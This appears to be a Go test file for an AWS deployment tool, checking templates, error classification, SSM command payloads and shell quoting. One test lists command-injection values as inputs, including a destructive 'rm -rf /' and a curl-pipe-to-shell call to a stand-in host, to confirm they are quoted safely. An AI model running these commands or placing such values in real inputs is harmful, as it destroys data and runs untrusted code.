package awsdeploy

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

// The instance executes these, and a CRLF in a shell script makes
// `set -euo pipefail\r` an invalid option name - which is exactly how a live deploy
// broke once. .gitattributes pins them to LF; this fails the build if that regresses,
// since embedded bytes are whatever was on disk at build time.
func TestEmbeddedAssetsAreUsableOnLinux(t *testing.T) {
	for _, name := range AssetNames() {
		b, err := Asset(name)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if len(b) == 0 {
			t.Fatalf("%s is empty", name)
		}
		if bytes.Contains(b, []byte("\r")) {
			t.Errorf("%s contains CR; it must be LF-only to run on the instance", name)
		}
	}
	if !bytes.HasPrefix(mustAsset("apply.sh"), []byte("#!/usr/bin/env bash")) {
		t.Error("apply.sh lost its shebang")
	}
	if _, err := Asset("nope.yaml"); err == nil {
		t.Error("a missing asset should be an error, not an empty file")
	}
}

// The template drives everything else, so the pieces the Go code names have to exist in
// it. A rename on one side only would fail at deploy time, against real infrastructure.
func TestTemplateAgreesWithTheCode(t *testing.T) {
	tpl := string(Template())
	for _, needle := range []string{
		"VpcId:", "SubnetId:", "SourceBucket:", "SourceKey:", "DomainName:",
		"AcmeEmail:", "EnvParameterName:", "InstanceType:", "WebCidr:", "TunnelCidr:",
		"WithDownloads:",
		"InstanceId:", "PublicIp:", "WebUrl:", "TunnelAddress:",
		applyPath(),
	} {
		if !strings.Contains(tpl, needle) {
			t.Errorf("template is missing %q", needle)
		}
	}
	// apply.sh has to find the compose file at the path it was moved to.
	if !strings.Contains(string(mustAsset("apply.sh")), AssetDir+"/compose.aws.yml") {
		t.Errorf("apply.sh does not reference %s/compose.aws.yml", AssetDir)
	}

	// Compose names the project after the directory holding the file unless told
	// otherwise. Moving this file once already stranded a deployment's containers while
	// colliding with their fixed names, so the project name stays pinned.
	compose := string(mustAsset("compose.aws.yml"))
	if !hasLine(compose, "name: moony") {
		t.Error("compose.aws.yml does not pin the project name; a moved file would break `up`")
	}
	if !strings.Contains(compose, "container_name: moony-relay") {
		t.Error("the relay container name changed; apply.sh reclaims it by name")
	}
}

func TestClassify(t *testing.T) {
	cases := []struct {
		name string
		msg  string
		want Problem
	}{
		{"not activated", "An error occurred (OptInRequired) when calling the DescribeVpcs operation: You are not subscribed to this service.", ProblemNotActivated},
		{"not signed up", "An error occurred (NotSignedUp) when calling the ListBuckets operation", ProblemNotActivated},
		{"free tier", "An error occurred (AccessDeniedException) when calling the ListPrices operation: Free Tier accounts are not supported for this service", ProblemFreeTier},
		{"no credentials", "Unable to locate credentials. You can configure credentials by running \"aws configure\".", ProblemNoCredentials},
		{"expired", "An error occurred (ExpiredToken) when calling the GetCallerIdentity operation", ProblemNoCredentials},
		{"denied", "An error occurred (AccessDenied) when calling the CreateBucket operation", ProblemAccessDenied},
		{"unauthorized", "An error occurred (UnauthorizedOperation) when calling the RunInstances operation", ProblemAccessDenied},
		{"unrelated", "Connect timeout on endpoint URL", ProblemNone},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := classify(c.msg); got != c.want {
				t.Fatalf("classify = %v, want %v", got, c.want)
			}
		})
	}

	// The free-tier message also contains "AccessDenied", so order matters: the more
	// specific case has to win or the advice sends people to the wrong place.
	if got := classify("AccessDeniedException: Free Tier accounts are not supported for this service"); got != ProblemFreeTier {
		t.Fatalf("free tier misclassified as %v", got)
	}
}

func TestAdviseNamesTheFix(t *testing.T) {
	err := advise(ProblemNotActivated, "123456789012", "ap-southeast-1", errors.New("OptInRequired"))
	for _, needle := range []string{"not activated", "123456789012", "ap-southeast-1", "billing"} {
		if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(needle)) {
			t.Errorf("advice does not mention %q: %v", needle, err)
		}
	}
	if got := advise(ProblemNone, "", "", errors.New("boom")); got.Error() != "boom" {
		t.Errorf("an unclassified error must pass through unchanged, got %v", got)
	}
}

func TestSendCommandInputIsValidJSON(t *testing.T) {
	in := convergeInputs{
		Bucket: "moony-deploy-1-ap-southeast-1", Key: "moony/relay-src-abc.tar.gz",
		TunnelHost: "47.130.19.62", SiteAddress: "relay.example.com",
		AcmeEmail: "you@example.com", WithDownloads: "0", EnvParameter: "/moony/relay-env",
	}
	b, err := sendCommandInput("i-123", convergeScript(in))
	if err != nil {
		t.Fatal(err)
	}
	var got struct {
		InstanceIds  []string
		DocumentName string
		Parameters   struct{ Commands []string }
	}
	if err := json.Unmarshal(b, &got); err != nil {
		t.Fatalf("payload is not valid JSON: %v\n%s", err, b)
	}
	if got.DocumentName != "AWS-RunShellScript" || len(got.InstanceIds) != 1 || got.InstanceIds[0] != "i-123" {
		t.Fatalf("unexpected envelope: %+v", got)
	}
	script := strings.Join(got.Parameters.Commands, "\n")
	for _, needle := range []string{
		"s3://moony-deploy-1-ap-southeast-1/moony/relay-src-abc.tar.gz",
		`TUNNEL_HOST='47.130.19.62'`,
		`SITE_ADDRESS='relay.example.com'`,
		`ACME_EMAIL='you@example.com'`,
		`ENV_PARAMETER='/moony/relay-env'`,
		applyPath(),
		"set -eux",
	} {
		if !strings.Contains(script, needle) {
			t.Errorf("script is missing %q\n%s", needle, script)
		}
	}
}

// Nothing in a value may reach the remote shell as syntax. Single quotes rather than
// Go's %q: %q leaves $ alone, and $(...) inside a double-quoted assignment is expanded
// by bash on the instance.
func TestConvergeScriptQuotesItsInputs(t *testing.T) {
	for _, evil := range []string{
		`x"; rm -rf /; echo "`,
		"$(curl evil.example/x | sh)",
		"`id`",
		"a'b",
		"${HOME}",
	} {
		lines := convergeScript(convergeInputs{
			Bucket: "b", Key: "k", TunnelHost: "1.2.3.4",
			SiteAddress: evil, WithDownloads: "0",
		})
		var assign string
		for _, l := range lines {
			if strings.Contains(l, "SITE_ADDRESS=") {
				assign = l
			}
		}
		if assign == "" {
			t.Fatalf("no SITE_ADDRESS assignment for %q", evil)
		}
		if !strings.Contains(assign, "SITE_ADDRESS='") {
			t.Errorf("%q was not single-quoted: %s", evil, assign)
		}
		if strings.Contains(evil, "'") {
			// The only way a literal quote may appear is spliced: '\''
			if !strings.Contains(assign, `'\''`) {
				t.Errorf("embedded quote in %q was not spliced: %s", evil, assign)
			}
		} else if strings.Count(assign, "'")%2 != 0 {
			t.Errorf("unbalanced quoting for %q: %s", evil, assign)
		}
	}

	// shellQuote directly: the spliced form is what makes this safe.
	if got := shellQuote("a'b"); got != `'a'\''b'` {
		t.Fatalf("shellQuote(%q) = %s", "a'b", got)
	}
	if got := shellQuote("$(id)"); got != `'$(id)'` {
		t.Fatalf("shellQuote left an expansion unquoted: %s", got)
	}
}

func TestOptionDefaults(t *testing.T) {
	d := New(Options{}, nil)
	got := d.Options()
	if got.Stack != "moony-relay" || got.InstanceType != "t4g.small" {
		t.Fatalf("unexpected defaults: %+v", got)
	}
	if got.WebCIDR != "0.0.0.0/0" || got.TunnelCIDR != "0.0.0.0/0" {
		t.Fatalf("CIDR defaults changed: %+v", got)
	}
	kept := New(Options{Stack: "s", InstanceType: "t3.small", WebCIDR: "1.2.3.4/32"}, nil).Options()
	if kept.Stack != "s" || kept.InstanceType != "t3.small" || kept.WebCIDR != "1.2.3.4/32" {
		t.Fatalf("explicit options were overwritten: %+v", kept)
	}
}

// Status must not treat a missing stack as a failure: that is the state a first deploy
// starts from, and the UI needs to render it.
func TestStatusTreatsAMissingStackAsEmpty(t *testing.T) {
	d := New(Options{Region: "ap-southeast-1"}, nil)
	d.account = "123"
	d.run = func(_ context.Context, name string, args ...string) (string, error) {
		if contains(args, "describe-stacks") {
			return "", errors.New("An error occurred (ValidationError): Stack with id moony-relay does not exist")
		}
		return "", errors.New("unexpected call: " + name + " " + strings.Join(args, " "))
	}
	st, err := d.Status(context.Background())
	if err != nil {
		t.Fatalf("a missing stack should not be an error: %v", err)
	}
	if st.StackStatus != "" || st.Stack != "moony-relay" {
		t.Fatalf("unexpected status: %+v", st)
	}
}

func TestStatusParsesOutputs(t *testing.T) {
	d := New(Options{Region: "r"}, nil)
	d.account = "123"
	d.run = func(_ context.Context, _ string, args ...string) (string, error) {
		switch {
		case contains(args, "Stacks[0].StackStatus"):
			return "UPDATE_COMPLETE", nil
		case contains(args, "Stacks[0].Outputs[].[OutputKey,OutputValue]"):
			return "WebUrl\thttps://relay.example.com\nInstanceId\ti-abc\n", nil
		}
		return "", errors.New("unexpected call")
	}
	st, err := d.Status(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if st.StackStatus != "UPDATE_COMPLETE" ||
		st.Outputs["WebUrl"] != "https://relay.example.com" || st.Outputs["InstanceId"] != "i-abc" {
		t.Fatalf("unexpected status: %+v", st)
	}
}

func TestWriteTempJSONRoundTrips(t *testing.T) {
	ref, cleanup, err := writeTempJSON("moony-test", []byte(`{"a":1}`))
	defer cleanup()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(ref, "file://") {
		t.Fatalf("ref = %q, want a file:// reference", ref)
	}
	if strings.Contains(ref, `\`) {
		t.Fatalf("ref = %q still has backslashes; the CLI wants forward slashes", ref)
	}
}

func TestLastLines(t *testing.T) {
	got := lastLines("a\n\nb\nc\nd\n", 2)
	if len(got) != 2 || got[0] != "c" || got[1] != "d" {
		t.Fatalf("lastLines = %q", got)
	}
	if n := len(lastLines("", 3)); n != 0 {
		t.Fatalf("empty input gave %d lines", n)
	}
}

// Guards the base64 helper the old shell script needed; the Go path passes the script
// as JSON array elements instead, which is what this asserts stays true.
func TestScriptIsNotBase64Wrapped(t *testing.T) {
	b, err := sendCommandInput("i-1", convergeScript(convergeInputs{Bucket: "b", Key: "k", TunnelHost: "h", SiteAddress: ":80"}))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "base64 -d") {
		t.Error("the payload wraps the script in base64; JSON encoding makes that unnecessary")
	}
	if _, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(b))); err == nil {
		t.Error("the payload looks like base64 rather than JSON")
	}
}

// hasLine reports whether s has a line equal to want, ignoring surrounding blanks.
func hasLine(s, want string) bool {
	for _, line := range strings.Split(s, "\n") {
		if strings.TrimRight(line, "\r") == want {
			return true
		}
	}
	return false
}

func contains(hay []string, needle string) bool {
	for _, h := range hay {
		if h == needle {
			return true
		}
	}
	return false
}
